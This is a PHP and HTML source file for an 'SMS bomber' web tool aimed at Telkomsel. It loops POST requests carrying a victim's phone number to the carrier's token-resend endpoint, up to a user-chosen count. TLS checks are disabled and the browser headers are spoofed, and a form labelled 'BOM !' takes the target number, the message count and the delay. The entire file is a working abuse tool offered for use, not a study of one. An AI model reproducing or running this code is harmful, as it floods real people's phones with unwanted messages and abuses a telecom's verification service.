<?php
/*
    ANONIMCYBER (c) 2018
    https://www.anonimcyber.com
    Author : Bos Husni Mubarok
*/
function telkbombv2($no, $jum, $wait = 0)
{
    $x      = 1;
    $result = "";
    while ($x <= $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://mobi.telkomsel.com/ulang/token");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "ci_csrf_token=daaac6aa63d46b9709f0e3d054a65c9b&msisdn=" . $no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://mobi.telkomsel.com/ulang?ch=WEB');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec($ch);
        curl_close($ch);
        $json = json_decode($server_output);
        if ($json->status == "1") {
            $result .= $x . ". Success send sms to " . $no . " <br>";
        } else {
            $result .= "✘ FAIL<br>";
        }
        if ($wait != 0) {
            sleep($wait);
        }
        $x++;
    }
    return ($result);
}
/*
    Author : Husni Mubarok
    Website : Anonimcyber.com
    Script : BOM SMS TELKOMSEL V2
    facebook : www.fb.com/husnimubarok03/
    gplus : https://plus.google.com/+HusniMubarokRamadhan
    !! Jangan edit atau ubah script diatas kalo gak mau error!!
*/


$nomor = $_POST['nomer'];
$jumlah = $_POST['jumlah'];
$jeda = $_POST['jeda'];
$execute = telkbombv2($nomor, $jumlah, $jeda);
print $execute;
?>
<!DOCTYPE html> 
<html>
 <head>
 <link rel="shortcut icon" href="tsel.png">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.6/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js"></script>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
 <style type="text/css">
/*{ padding: 0; margin: 0; } h2{    color:#50626C;  text-align: center;     font-family: arial;     text-transform: uppercase;  border: 5px solid #f1f1f1;  padding: 5px;   width: 300px;   margin: auto;   margin-bottom: 10px; margin-top: 20px; } form { border: 3px solid #f1f1f1; font-family: arial; width: 300px; margin: auto; } input[type=text], input[type=password] , input[type=number]{ width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; box-sizing: border-box; } label{   color:#50626C;  text-transform: uppercase; } button { background-color: #049372; color: white; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 100%; } button:hover { opacity: 0.8; } .cancelbtn { width: auto; padding: 10px 18px; background-color: #f03434; } .imgcontainer { text-align: center; margin: 24px 0 12px 0; } img.avatar { width: 40%; border-radius: 50%; } .container { padding: 16px; } span.psw { float: right; padding-top: 16px; } span{     color:#50626C; } /* Change styles for span and cancel button on extra small screens */ /*@media screen and (max-width: 300px) { span.psw { display: block; float: none; } .cancelbtn { width: 100%; } }*/*/
    </style>
<title>Bom SMS TELKOMSEL V2</title>
<link rel="stylesheet" href="style.css" type="text/css">
</head>
<body><!-- 
<h2>Spam</h2>
<form action=""index.php" method="POST">
<div class="container"> 
<label><b>Nomer</b></label> <input type="text" placeholder="Nomer... (085123123...)" name="nomer" id="nomer" value="" required> 

<label><b>Jumlah</b></label> <input type="number" placeholder="Jumlah... (1 - 99999) " name="jumlah" id="jumlah" required> 

<button type="submit">Tembak</button>
<br><br><br>
<center>
<h5>Created By : 
<a href="https://m.facebook.com/husnimubarok03">Mr. Husni Mr</a>
</h5>
</center> -->
<style type="text/css">
    .formBom{margin-top: 50px; border-radius: 5px;} .headerForm{background-color:#FF6347; color: #fff;padding: 10px 0; font-weight: 1000; margin-bottom: 20px;} body{background:#2C3E50; background-size: cover;} .formBody{background-color: #fff;padding: 10px 20px;} .formBom {background-color: #fff;} form {} button {width: 100%; background-color:#FF6347; color: #fff;}  .btn:hover {background-color: #FF6347; color: #fff;}
</style>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Ads Footernew -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6368709975044652"
     data-ad-slot="4714768076"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
    <div class="container">
        <div class="col-md-4"></div>
        <div class="col-md-4">
            <div class="formBom">
                <div class="headerForm">
                    <h2 class="text-center">BOM SMS TELKOMSEL UNLIMITED</h2>
                </div>
                <div class="formBody">
                   <div class="alert alert-info"><strong>BOM SMS TELKOMSEL UNLIMITED</strong>
    <br>- Khusus untuk Telkomsel
    <br>- Isi semua input dengan benar
    <br>- Gunakan dengan bijak
    <br>@ Created By Ferguso Kontoloso
    </div>
  
    <form method="POST" action="index.php">
                      <div class="form-group">
                        <label for="exampleInputEmail1"><span class="glyphicon glyphicon-earphone" aria-hidden="true"></span> No Telp</label>
                        <input type="number" class="form-control" name="nomer" id="exampleInputEmail1" placeholder="Nomor telepon (ex: 0812xxxxxx)">
                      </div>
                      <div class="form-group">
                        <label for="exampleInputPassword1">Jumlah SMS</label>
                        <input type="number" class="form-control" name="jumlah" id="exampleInputPassword1" placeholder="Jumlah (1 - 500)">
                      </div>
                      <div class="form-group">
                        <label for="exampleInputPassword1">Jeda Perdetik SMS</label>
                        <input type="number" class="form-control" name="jeda" id="exampleInputPassword1" placeholder="Jeda (1 - 10) detik">
                      </div>
                      <button type="submit" class="btn" name="BOM">BOM !</button>
                    </form>
                
                    <br><br>
                    
</body> </html>
<?php



        
    
?>
